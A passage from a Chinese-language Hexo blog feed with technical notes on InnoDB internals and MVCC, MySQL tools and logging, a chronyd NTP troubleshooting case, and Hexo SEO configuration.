<li>自适应哈希索引，无需人工干预，是系统根据情况自动完成的<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%hash_index%&#x27;;</span><br><span class="line">+----------------------------------+-------+</span><br><span class="line">| Variable_name                    | Value |</span><br><span class="line">+----------------------------------+-------+</span><br><span class="line">| innodb_adaptive_hash_index       | ON    |</span><br><span class="line">| innodb_adaptive_hash_index_parts | 8     |</span><br><span class="line">+----------------------------------+-------+</span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="log-buffer">Log Buffer</span></h4><p>用于保存要写入到磁盘中的log(redo log, undo log), 默认大小16MB，参数：</p>
<ul>
<li>innodb_log_buffer_size 			缓冲区大小</li>
<li>innodb_flush_log_at_trx_commit	日志刷新到磁盘时机</li>
</ul>
<h4><span id="磁盘结构">磁盘结构</span></h4><ul>
<li><p>System Tablespace: 系统表空间是更改缓冲区的存储区域，如果表是在系统表空间而不是每个表文件或通用表空间中创建的，也可能含表和索引数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%data_file_path%&#x27;;</span><br><span class="line">+----------------------------+------------------------+</span><br><span class="line">| Variable_name              | Value                  |</span><br><span class="line">+----------------------------+------------------------+</span><br><span class="line">| innodb_data_file_path      | ibdata1:12M:autoextend |</span><br><span class="line">+----------------------------+------------------------+</span><br></pre></td></tr></table></figure></li>
<li><p>File-Per-Table Tablespaces: 每个表的文件表空间包含单个InnoDB表数据和索引，并存储在文件系统的单个数据文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%innodb_file_per_table%&#x27;;</span><br><span class="line">+-----------------------+-------+</span><br><span class="line">| Variable_name         | Value |</span><br><span class="line">+-----------------------+-------+</span><br><span class="line">| innodb_file_per_table | ON    |</span><br><span class="line">+-----------------------+-------+</span><br></pre></td></tr></table></figure></li>
<li><p>Gerneral Tablespaces: 通用表空间，需通过craete tablespace语法创建通用表空间，创建表时可以指定该表空间</p>
</li>
<li><p>Undo Tablespaces: 撤销表空间，MySQL实例在初始化时会自动创建两个默认undo表空间，用于存储undo log</p>
</li>
<li><p>Doublewrite Buffer Files: 双写缓冲区，innoDB将数据页从Buffer Pool刷新到磁盘前，先将数据页写入双写缓冲区文件中，便于系统异常时恢复数据。<br>(#ib_16384_0.dblwr, #ib_16384_1.dblwr)</p>
</li>
<li><p>Redo Log: 重做日志，两部分组成(redo log buffer, redo log)，当事务提交后会把所有修改信息存到日志中，用于刷新脏页到磁盘发生错误时，进行数据恢复<br>文件(ib_logfile0, ib_logfile1)</p>
</li>
</ul>
<h4><span id="后台线程">后台线程</span></h4><ul>
<li>Master Thread 核心线程，负责调度其他线程，将缓冲池中数据异步刷新到磁盘，包括脏页刷新，合并插入缓存，undo页回收</li>
<li>IO Thread InnoDB使用AIO处理IO请求<table>
<thead>
<tr>
<th>线程类型</th>
<th>默认个数</th>
<th>职责</th>
</tr>
</thead>
<tbody><tr>
<td>Read Thread</td>
<td>4</td>
<td>负责读操作</td>
</tr>
<tr>
<td>Write Thread</td>
<td>4 负责写操作</td>
<td></td>
</tr>
<tr>
<td>Log Thread</td>
<td>1</td>
<td>负责将日志缓冲区刷新到磁盘</td>
</tr>
<tr>
<td>Insert Buffer Thread</td>
<td>1</td>
<td>负责将缓冲区内容刷新到磁盘</td>
</tr>
</tbody></table>
</li>
</ul>
<h3><span id="事务原理">事务原理</span></h3><h4><span id="redo-log">redo log</span></h4><p>重做日志，记录事务提交时数据页的物理修改，用来实现事务的持久性，由两部分组成</p>
<ul>
<li>redo log buffer(内存)</li>
<li>redo log file(磁盘)<br>事务提交后会把所有修改信息都存到日志文件中，用于刷新脏页到磁盘发生错误时，进行数据恢复使用。</li>
</ul>
<h4><span id="undo-log">undo log</span></h4><p>回滚日志，记录数据被修改前的信息，作用：提供回滚, MVCC<br>undo log 记录逻辑日志(01:05)<br><a href="https://www.bilibili.com/video/BV1Kr4y1i7ru?spm_id_from=333.788.player.switch&vd_source=d8559c2d87607be86810cd806158bb86&p=140">https://www.bilibili.com/video/BV1Kr4y1i7ru?spm_id_from=333.788.player.switch&amp;vd_source=d8559c2d87607be86810cd806158bb86&amp;p=140</a></p>
<h3><span id="mvcc">MVCC</span></h3><p>MVCC的几个重要概念：</p>
<p><strong>当前读</strong><br>读取记录的最新版本，读取时要保证其他并发事务不能修改当前记录，会对读取记录加锁。比如:<br>select … lock in share mode, select … for update, insert, delete都是一种当前读</p>
<p>例: 先在客户端c1开启事务, 再从客户端c2更新tb_user表id&#x3D;1记录并提交，此时c1不能查到c2修改的记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 客户端c1开启事务</span><br><span class="line">mysql&gt; begin;</span><br><span class="line">mysql&gt; select * from tb_user;</span><br><span class="line">+----+-------+</span><br><span class="line">| id | value |</span><br><span class="line">+----+-------+</span><br><span class="line">|  1 |     1 |</span><br><span class="line">+----+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 客户端c2更新tb_user表id=1记录，并提交事务</span><br><span class="line">mysql&gt; begin;</span><br><span class="line">mysql&gt; update tb_user set value = 2 where id = 1;</span><br><span class="line">mysql&gt; commit;</span><br><span class="line"></span><br><span class="line">-- 切到客户端c1，此时c1中查不到c2修改的记录, 即可重复读</span><br><span class="line">mysql&gt; select * from tb_user;</span><br><span class="line">+----+-------+</span><br><span class="line">| id | value |</span><br><span class="line">+----+-------+</span><br><span class="line">|  1 |     1 |</span><br><span class="line">+----+-------+</span><br><span class="line"></span><br><span class="line">-- 如果通过select * lock in share mode 使用当前读，就可以查到c2修改的记录</span><br><span class="line">mysql&gt; select * from tb_user lock in share mode;</span><br><span class="line">+----+-------+</span><br><span class="line">| id | value |</span><br><span class="line">+----+-------+</span><br><span class="line">|  1 |     2 |</span><br><span class="line">+----+-------+</span><br></pre></td></tr></table></figure>
<p><strong>快照读</strong><br>简单的select就是快照读，读取的是记录数据的可见版本，有可能是历史数据，不加锁，是非阻塞读</p>
<ul>
<li>read committed: 每次select都生成一个快照读</li>
<li>Repeatable Read: 开启事务后第一个select语句才是快照读</li>
<li>Serializable: 快照读退化为当前读</li>
</ul>
<p><strong>MVCC</strong><br>全称 Multi-Version Concurrency Control 多版本并发控制。指维护一个数据的多个版本，使读写操作无冲突<br>快照读为MySQL实现MVCC提供了一个非阻塞读的功能，MVCC的实现依赖数据库记录中三个隐式字段、undo log日志、readView</p>
<h4><span id="mvcc实现原理">MVCC实现原理</span></h4><p><strong>记录中的隐藏字段</strong><br>隐式增加了两个字段DB_TRX_ID, DB_ROLL_PTR</p>
<table>
<thead>
<tr>
<th>隐藏字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>DB_TRX_ID</td>
<td>最近修改事务ID，记录插入这条记录或最后一次修改改记录的事务ID</td>
</tr>
<tr>
<td>DB_ROLL_PTR</td>
<td>回滚指针, 指向这条记录的上一个版本，用于配合undo log, 指向上一个版本</td>
</tr>
<tr>
<td>DB_ROW_ID</td>
<td>隐藏主键, 如果表结构没有指定主键。将会生成该隐藏字段</td>
</tr>
</tbody></table>
<p>查看隐藏字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ibd2sdi /var/lib/mysql/pc/tb_user.ibd</span><br></pre></td></tr></table></figure>

<p><strong>undo log</strong><br>回滚日志, 在insert, update, delete时产生的，便于数据回滚的日志。</p>
<ul>
<li>当insert时候，产生的undo log只在回滚时需要，事务提交后可被立即删除。</li>
<li>而update,delete时候，产生的undo log不仅在回滚时需要，在快照读时也需要，不会被立即删除。</li>
</ul>
<p><strong>undo log版本链</strong><br>不同事务或相同事务对同一条记录进行修改，<br>会导致该记录undolog生成一条记录版本链表，链表头部是最新的旧记录，链表尾部是最早的旧记录</p>
<p>** readview **<br>readview (读视图)是快照读SQL执行时MVCC提取数据的依据，记录并维护系统当前活跃的事务id<br>readview 包括四个核心字段</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>m_ids</td>
<td>当前活跃的事务ID集合</td>
</tr>
<tr>
<td>min_trx_id</td>
<td>最小活跃事务ID</td>
</tr>
<tr>
<td>max_trx_id</td>
<td>预分配事务ID, 当前最大事务ID+1</td>
</tr>
<tr>
<td>creator_trx_id</td>
<td>ReadView创建者的事务ID</td>
</tr>
</tbody></table>
<ul>
<li>trx_id &#x3D;&#x3D; creator_trx_id 可以访问该版本, 说明数据是当前这个事务更改的</li>
<li>trx_id &lt; min_trx_id 可以访问该版本, 说明数据已经提交了</li>
<li>trx_id &gt; max_trx_id 不可以访问该版本, 说明该事务在ReadView生成后才开启</li>
<li>min_trx_id &lt;&#x3D; trx_id &lt;&#x3D; max_trx_id 如果trx_id不在m_ids中是可以访问该版本的</li>
</ul>
<p>不同的隔离级别，生成readview的时机不同：</p>
<ul>
<li>READ COMMITTED: 在事务中每一次执行快照读时生成Read View</li>
<li>REPEATABLE READ: 仅在事务中第一次执行快照读时生成ReadView, 后续复用该ReadView (可重复读)</li>
</ul>
<h2><span id="mysql管理">MySQL管理</span></h2><h3><span id="系统数据库">系统数据库</span></h3><ul>
<li>mysql 存储MySQL正常运行所需各种信息(时区、主从、用户、权限) </li>
<li>information_schema 提供了访问数据库元数据的各种表和视图，包含数据库，表，字段类型以及访问权限</li>
<li>performance_schema 为MySQL运行时状态提供了一个底层监控功能，主要用于收集数据库服务器性能参数</li>
<li>sys 包含一系列方便DBA和开发人员利用performance_schema性能数据库进行性能调优和诊断的视图</li>
</ul>
<h3><span id="常用工具">常用工具</span></h3><h4><span id="mysql">mysql</span></h4><p>例: 通过mysql -e直接执行语句，无需进入交互式命令行 (用户名root,密码123,数据库名称pc)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p123 pc -e &quot;select * from tb_user&quot;</span><br></pre></td></tr></table></figure>
<h4><span id="mysqladmin">mysqladmin</span></h4><p>一个执行管理操作的客户端程序，可以用它检查服务器配置和当前状态，创建并删除数据库等。</p>
<h4><span id="mysqlbinlog">mysqlbinlog</span></h4><p>检查二进制日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqlbinlog -s binlog.000006 /var/lib/mysql/binlog.000006</span><br></pre></td></tr></table></figure>

<h4><span id="mysqlshow">mysqlshow</span></h4><p>mysqlshow客户端对象查找工具，用来很快查找存在哪些数据库，数据库中的表，表中的列或者索引。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># mysqlshow -uroot -pXXXXXX --count</span><br><span class="line">mysqlshow: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">+--------------------+--------+--------------+</span><br><span class="line">|     Databases      | Tables |  Total Rows  |</span><br><span class="line">+--------------------+--------+--------------+</span><br><span class="line">| gx_day15           |     12 |           70 |</span><br><span class="line">| gx_day16           |     14 |           75 |</span><br><span class="line">| information_schema |     79 |        29745 |</span><br><span class="line">| mysql              |     37 |         4090 |</span><br><span class="line">| pc                 |      3 |            2 |</span><br><span class="line">| performance_schema |    111 |       295786 |</span><br><span class="line">| sys                |    101 |         6398 |</span><br><span class="line">+--------------------+--------+--------------+</span><br></pre></td></tr></table></figure>

<h4><span id="mysqldump">mysqldump</span></h4><p>mysqldump用于备份数据库和在不同数据库间作数据迁移。备份内容包含创建表，以及插入表的SQL语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -ppassword dbname &gt; output.sql</span><br></pre></td></tr></table></figure>











<h2><span id="查看mysql版本">查看MySQL版本</span></h2><p><a href="https://github.com/mysql/mysql-server/releases/tag/mysql-8.0.36">https://github.com/mysql/mysql-server/releases/tag/mysql-8.0.36</a></p>
<h2><span id="进程模型">进程模型</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl cat mysqld | grep ExecStart=</span><br><span class="line">ExecStart=/usr/libexec/mysqld --basedir=/usr</span><br></pre></td></tr></table></figure>
<p>单进程多线程模型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps axf | grep mysqld</span><br><span class="line">  16273 ?        Ssl    0:33 /usr/libexec/mysqld --basedir=/usr</span><br><span class="line">ps -T 16273</span><br><span class="line">    PID    SPID TTY      STAT   TIME COMMAND</span><br><span class="line">  16273   16273 ?        Ssl    0:00 /usr/libexec/mysqld --basedir=/usr</span><br><span class="line">  16273   16276 ?        Ssl    0:00 /usr/libexec/mysqld --basedir=/usr</span><br><span class="line">  16273   16277 ?        Ssl    0:00 /usr/libexec/mysqld --basedir=/usr</span><br><span class="line">	....</span><br></pre></td></tr></table></figure>
<p><a href="https://www.jcwlyf.com/newsContent-id-18272.html">https://www.jcwlyf.com/newsContent-id-18272.html</a></p>
<p>mysqld进程</p>
<ul>
<li>监听线程，接受客户端连接请求；</li>
<li>查询线程，处理客户端发来的SQL查询；</li>
<li>复制线程，处理主从复制相关操作；</li>
<li>后台线程，执行定期任务如日志清理、缓存刷新等。</li>
</ul>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>chronyd配置了local的NTP server后, NTP报文出现public ip的问题</title>
    <url>/2024/1026131259.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p>客户在Rocky Linux 9.4的VM上配了一个local的NTP server(IP: 10.64.1.76)。配置完成后, 时钟可以同步，但一段时间后客户的firewall收到告警, 拒绝了大量目标端口为123的请求, 且这些请求的目的IP并不是客户指定的NTP server的IP，客户要求解释原因并给出解决方案。</p>
<h2><span id="定位">定位</span></h2><p>先通过<code>chronyc sourcestats</code>命令，查看当前连接的NTP服务器</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Name/IP Address            NP  NR  Span  Frequency  Freq Skew  Offset  Std Dev</span><br><span class="line">==============================================================================</span><br><span class="line">10.64.1.76                  1   0     0     +0.000   2000.000    +15us  4000ms</span><br><span class="line">117.80.112.205              0   0     0     +0.000   2000.000     +0ns  4000ms</span><br><span class="line">202.112.29.82               0   0     0     +0.000   2000.000     +0ns  4000ms</span><br><span class="line">tock.ntp.infomaniak.ch      0   0     0     +0.000   2000.000     +0ns  4000ms</span><br><span class="line">2001:da8:9000::130          2   0     2     +0.000   2000.000  -1254us  4000ms</span><br><span class="line">ntp1.flashdance.cx          0   0     0     +0.000   2000.000     +0ns  4000ms</span><br><span class="line">tock.ntp.infomaniak.ch      0   0     0     +0.000   2000.000     +0ns  4000ms</span><br><span class="line">2001:470:1d:281::123        1   0     0     +0.000   2000.000    -12ms  4000ms</span><br><span class="line">time.cloudflare.com         1   0     0     +0.000   2000.000  -2445us  4000ms</span><br></pre></td></tr></table></figure>
<p>结果显示, 除了客户指定的NTP server(10.64.1.76), chronyd的确连接了其他的server, 通过tcpdump抓包也能看出NTP报文中出现了public IP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# tcpdump -i eth0 dst port 123 -n</span><br><span class="line">07:14:03.968036 IP6 2620:101:4002:800b:456f:575f:396d:fe0d.30612 &gt; 2001:da8:9000::130.ntp: NTPv4, Client, length 48</span><br><span class="line">07:14:05.261407 IP6 2620:101:4002:800b:456f:575f:396d:fe0d.34042 &gt; 2606:4700:f1::123.ntp: NTPv4, Client, length 48</span><br><span class="line">07:14:05.850132 IP 10.206.216.92.63453 &gt; 10.64.1.76.ntp: NTPv4, Client, length 48</span><br><span class="line">07:14:06.383730 IP6 2620:101:4002:800b:456f:575f:396d:fe0d.39439 &gt; 2001:470:1d:281::123.ntp: NTPv4, Client, length 48</span><br><span class="line">07:15:08.229127 IP6 2620:101:4002:800b:456f:575f:396d:fe0d.57634 &gt; 2001:da8:9000::130.ntp: NTPv4, Client, length 48</span><br><span class="line">07:15:10.499490 IP6 2620:101:4002:800b:456f:575f:396d:fe0d.52853 &gt; 2606:4700:f1::123.ntp: NTPv4, Client, length 48</span><br></pre></td></tr></table></figure>

<p>检查配置文件&#x2F;etc&#x2F;chrony.conf, 发现同时配置了server和pool, 如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server 10.64.1.76 iburst</span><br><span class="line">pool 2.rocky.pool.ntp.org iburst</span><br></pre></td></tr></table></figure>
<p>查阅资料发现，当同时配了server和pool时，chrony会同时向server以及NTP pool中的server发送请求，根据一定的算法和策略选择最准确可靠的源来同步系统时钟。 默认的<code>2.rocky.pool.ntp.org</code>是一个public的NTP pool，所以客户防火墙deny了这些public IP.</p>
<p>想搞清楚NTP选择source的策略，需要下一份源码调试，后面有时间再来研究</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># chronyd --version  确认chronyd版本</span><br><span class="line">chronyd (chrony) version 4.3</span><br><span class="line">源码: https://git.tuxfamily.org/chrony/chrony.git/</span><br></pre></td></tr></table></figure>

<h2><span id="解决方法">解决方法</span></h2><ul>
<li>让客户放开这些public IP，或者123端口(这种做法显然不安全)</li>
<li>或者禁用pool, 修改&#x2F;etc&#x2F;chrony.conf, 删掉<code>pool 2.rocky.pool.ntp.org iburst</code>, 再<code>systemctl restart chronyd</code>重启chronyd. (这种方法会降低时间同步的可靠性，如果local server不工作，时间同步就会失败)</li>
</ul>
<h2><span id="参考">参考</span></h2><p><a href="https://chrony-project.org/index.html">https://chrony-project.org/index.html</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>chronyd</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo搭建博客问题记录</title>
    <url>/2024/1026143114.html</url>
    <content><![CDATA[<h2><span id="hexogithub-homepage搭建个人站点">Hexo+github homepage搭建个人站点</span></h2><p>参考：<a href="https://mini-pi.github.io/2024/02/28/how-to-make-blog-wedsite/">2024年，如何使用 github pages + Hexo + Next 搭建个人博客</a></p>
<span id="more"></span>

<h2><span id="seo搜索引擎优化">SEO搜索引擎优化</span></h2><p>SEO (Search Engine Optimization)，即搜索引擎优化。<br>简单来说，SEO就是您可以使用提升网站排名的所有方法的总称，SEO用于确保您的网站及其内容在搜索引擎结果页面（SERP）上的可见性。</p>
<h3><span id="编辑网站信息">编辑网站信息</span></h3><p>编辑<code>_config.yaml</code>, 找到<code># Site</code>部分，编辑网站信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Site</span><br><span class="line">title: PC&#x27;s Blog</span><br><span class="line">subtitle: Life is short, Play more!</span><br><span class="line">description: &quot;PC&#x27;s Blog, PC的博客, PC的日志&quot;</span><br><span class="line">keywords: &quot;PC,博客,Blog,Hexo&quot;</span><br><span class="line">author: PC</span><br><span class="line">language: zh-CN</span><br><span class="line">timezone: Asia/Shanghai</span><br></pre></td></tr></table></figure>

<h3><span id="添加网站地图">添加网站地图</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-seo-friendly-sitemap --save</span><br></pre></td></tr></table></figure>
<p>Hexo配置文件中添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sitemap:</span><br><span class="line">    path: sitemap.xml</span><br><span class="line">    tag: false</span><br><span class="line">    category: false</span><br></pre></td></tr></table></figure>
<ul>
<li>tag:false, category:false: 网站地图排除标签和分类页面</li>
<li>将sitemap.xml, post-sitemap.xml, page-sitemap.xml 提交后Google Search Console</li>
</ul>
<h3><span id="添加robotstxt">添加robots.txt</span></h3><ul>
<li><code>robots.txt</code>是存放在网站根目录下的一个纯文本文件，可以指定搜索引擎蜘蛛只抓取指定内容，或禁止抓取网站部分内容，可以指定sitemap地址 <a href="https://www.w3cschool.cn/tools/index?name=createrobots">robots.txt在线生成工具</a></li>
<li>在source目录下新建robots.txt</li>
</ul>
<h3><span id="nofollow标签">nofollow标签</span></h3><h3><span id="给博客文章生成短链">给博客文章生成短链</span></h3><p>编辑站点的<code>_config.yml</code>(非主题<code>_config.yml</code>)</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">:layout/:year:month:day:hour:minute:second.html</span></span><br><span class="line"><span class="attr">permalink_defaults:</span></span><br><span class="line"><span class="attr">pretty_urls:</span></span><br><span class="line">  <span class="attr">trailing_index:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span></span><br><span class="line">  <span class="attr">trailing_html:</span> <span class="literal">true</span> <span class="comment"># Set to false to remove trailing &#x27;.html&#x27; from permalinks</span></span><br></pre></td></tr></table></figure>
<p>注:</p>
<ul>
<li>Hexo生成博客文章URL链接时，默认是:year&#x2F;:month&#x2F;:day&#x2F;:title&#x2F;这样的格式。如果博客文件名有中文的话，URL链接就会包含中文，复制URL路径把它粘贴到其他地方就会把中文变成一大堆乱码，使用不便而且会影响网站的SEO，同时链接层级太多也将影响SEO。</li>
<li>URL构成越简单越好，百度建议URL不要超过255字节。一个英文字符1字节，一个中文字符2字节。</li>
</ul>
<h2><span id="自定义文章底部的版权声明">自定义文章底部的版权声明</span></h2><p>编辑themes&#x2F;next&#x2F;language&#x2F;zh-CN.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post:</span> </span><br><span class="line">  <span class="attr">copyright:</span></span><br><span class="line">    <span class="attr">license_content:</span> <span class="string">&quot;所有文章都欢迎转载，注明出处即可.&quot;</span></span><br></pre></td></tr></table></figure>


<h2><span id="参考资料">参考资料</span></h2><p><a href="https://mini-pi.github.io/2024/02/28/how-to-make-blog-wedsite">https://mini-pi.github.io/2024/02/28/how-to-make-blog-wedsite</a><br><a href="https://www.duheweb.com/post/20210414222449.html">https://www.duheweb.com/post/20210414222449.html</a><br><a href="https://blog.dejavu.moe/posts/hexo-seo/">https://blog.dejavu.moe/posts/hexo-seo/</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL运维</title>
    <url>/2024/1030215315.html</url>
    <content><![CDATA[<h1><span id="日志">日志</span></h1><h2><span id="错误日志">错误日志</span></h2><p>错误日志记录了mysqld启动和停止时，以及服务器运行中错误信息。数据库出故障时，应首先查看此日志。<br>日志默认路径: <code>/var/log/mysql/mysqld.log</code>, 查看方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%log_error%&#x27;;</span><br><span class="line">+----------------------------+----------------------------------------+</span><br><span class="line">| Variable_name              | Value                                  |</span><br><span class="line">+----------------------------+----------------------------------------+</span><br><span class="line">| binlog_error_action        | ABORT_SERVER                           |</span><br><span class="line">| log_error                  | /var/log/mysql/mysqld.log              |</span><br><span class="line">| log_error_services         | log_filter_internal; log_sink_internal |</span><br><span class="line">| log_error_suppression_list |                                        |</span><br><span class="line">| log_error_verbosity        | 2                                      |</span><br><span class="line">+----------------------------+----------------------------------------+</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2><span id="二进制日志">二进制日志</span></h2><p>binlog记录所有DDL和DML语句，但不包括select,show语句<br>binlog作用：</p>
<ul>
<li>灾难时数据恢复</li>
<li>MySQL主从复制<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%log_bin%&#x27;;</span><br><span class="line">+---------------------------------+-----------------------------+</span><br><span class="line">| Variable_name                   | Value                       |</span><br><span class="line">+---------------------------------+-----------------------------+</span><br><span class="line">| log_bin                         | ON                          |</span><br><span class="line">| log_bin_basename                | /var/lib/mysql/binlog       |</span><br><span class="line">| log_bin_index                   | /var/lib/mysql/binlog.index |</span><br><span class="line">| log_bin_trust_function_creators | OFF                         |</span><br><span class="line">| log_bin_use_v1_row_events       | OFF                         |</span><br><span class="line">| sql_log_bin                     | ON                          |</span><br><span class="line">+---------------------------------+-----------------------------+</span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cat /var/lib/mysql/binlog.index</span><br><span class="line">./binlog.000001</span><br><span class="line">./binlog.000002</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p><strong>日志格式</strong></p>
<ul>
<li>STAETMENT 基于SQL语句日志记录，记录的是SQL语句，对数据进行修改的SQL都会记录在日志文件中。</li>
<li>ROW 基于行的日志记录，记录的是每一行的数据变更 (默认)</li>
<li>MIXED 混合了STATEMENT和ROW两种格式, 默认采用STATEMENT, 在某些特殊情况下自动切换为ROW进行记录</li>
</ul>
<p>查看默认日志格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%binlog_format%&#x27;;</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------+-------+</span><br><span class="line">| binlog_format | ROW   |</span><br><span class="line">+---------------+-------+</span><br><span class="line"></span><br><span class="line">-- 后台查询binlog </span><br><span class="line"># mysqlbinlog -v binlog.000001</span><br><span class="line">### UPDATE `pc`.`score`</span><br><span class="line">### WHERE</span><br><span class="line">###   @1=1</span><br><span class="line">###   @2=&#x27;Tom&#x27;</span><br><span class="line">###   @3=11</span><br><span class="line">###   @4=20</span><br><span class="line">###   @5=30</span><br><span class="line">### SET</span><br><span class="line">###   @1=1</span><br><span class="line">###   @2=&#x27;Tom&#x27;</span><br><span class="line">###   @3=12</span><br><span class="line">###   @4=20</span><br><span class="line">###   @5=30</span><br><span class="line">### UPDATE `pc`.`score`</span><br><span class="line">......</span><br><span class="line"># End of log file</span><br></pre></td></tr></table></figure>

<p><strong>日志删除</strong><br>对于繁忙的业务系统，每天生成大量的binlog数据，如果长时间不清理，将占用大量磁盘空间，可以通过以下几种方式清理日志：</p>
<table>
<thead>
<tr>
<th>指令</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>reset master</td>
<td>删除全部binlog日志，删除之后日志编号将从binlog.000001重新开始</td>
</tr>
<tr>
<td>purge master logs to ‘binlog.******’</td>
<td>删除******编号之前的所有binlog</td>
</tr>
<tr>
<td>purge master logs before ‘yyyy-mm-idd hh24:mm:ss</td>
<td>删除给定时间点之前产生的所有binlog</td>
</tr>
</tbody></table>
<h2><span id="查询日志">查询日志</span></h2><p>查询日志记录了客户端所有操作语句, binlog不包含查询数据的SQL语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%general%&#x27;;</span><br><span class="line">+------------------+--------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                      |</span><br><span class="line">+------------------+--------------------------------------------+</span><br><span class="line">| general_log      | OFF                                        |</span><br><span class="line">| general_log_file | /var/lib/mysql/iZuf65qw76eb18m9yp8b38Z.log |</span><br><span class="line">+------------------+--------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>查询日志默认是关闭的, 开启查询日志需要修改MySQL配置文件<code>/etc/my.cnf.d/mysql-server.cnf</code>, 添加如下内容:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">general_log=1</span><br><span class="line">general_log_file=/var/lib/mysql/mysql_query.log</span><br></pre></td></tr></table></figure>
<p>再重启MySQL <code>system restart mysqld</code></p>
<h2><span id="慢查询日志">慢查询日志</span></h2><p>记录了所有执行时间超过参数long_query_time设置值，并且扫描记录数不小于min_examined_row_limit的所有SQL语句日志, 默认未开启：<br>修改<code>/etc/my.cnf.d/mysql-server.cnf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#慢查询日志开关</span><br><span class="line">slow_query_log=1</span><br><span class="line">#执行时间参数</span><br><span class="line">long_query_time=2</span><br></pre></td></tr></table></figure>
<p>默认情况下，不记录管理语句，也不记录不适用索引查找的语句。可以修改配置文件改变这个默认的行为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#记录执行较慢的管理语句</span><br><span class="line">log_slow_admin_statements=1</span><br><span class="line">#记录执行较慢的未使用索引的语句</span><br><span class="line">log_queries_not_using_indexes=1</span><br></pre></td></tr></table></figure>

<h1><span id="主从复制">主从复制</span></h1><h2><span id="概述">概述</span></h2><p>主从复制指将主库的DDL和DML通过二进制日志传到从库, 然后在从库对这些日志重新执行(重做), 从而使得从库和主库数据保持同步<br>MySQL支持一台主库同时向多台从库复制，从库同时可作为其他从服务器的主库，实现链状复制</p>
<p>主从复制解决以下问题：</p>
<ul>
<li>主库故障，可以切换到从库提供服务</li>
<li>实现读写分离, 降低主库访问压力</li>
<li>在从库中执行备份，避免备份期间影响主库服务</li>
</ul>
<h2><span id="原理">原理</span></h2><p><img data-src="/2024/1030215315/mysql-master-slave-1.png"></p>
<ul>
<li>Master主库在事务提交时，会吧数据变更记录在二进制日志文件Binlog中</li>
<li>从库读取主库的二进制日志文件Binlog, 写入到从库的中继日志Relay Log</li>
<li>slave重做中继日志中的事件，将改变反映它自己的数据</li>
</ul>
<h2><span id="搭建">搭建</span></h2><p><a href="https://www.bilibili.com/video/BV1Kr4y1i7ru?spm_id_from=333.788.player.switch&vd_source=d8559c2d87607be86810cd806158bb86&p=160">https://www.bilibili.com/video/BV1Kr4y1i7ru?spm_id_from=333.788.player.switch&amp;vd_source=d8559c2d87607be86810cd806158bb86&amp;p=160</a><br>准备两台服务器<br>(TODO 搞两台虚拟机)</p>
<h1><span id="分库分表">分库分表</span></h1><p>单数据库问题:</p>
<ul>
<li>IO瓶颈: 热点数据多，数据库缓存不足，产生大量磁盘IO，效率低。请求数据太多，带宽不够，网络IO瓶颈</li>
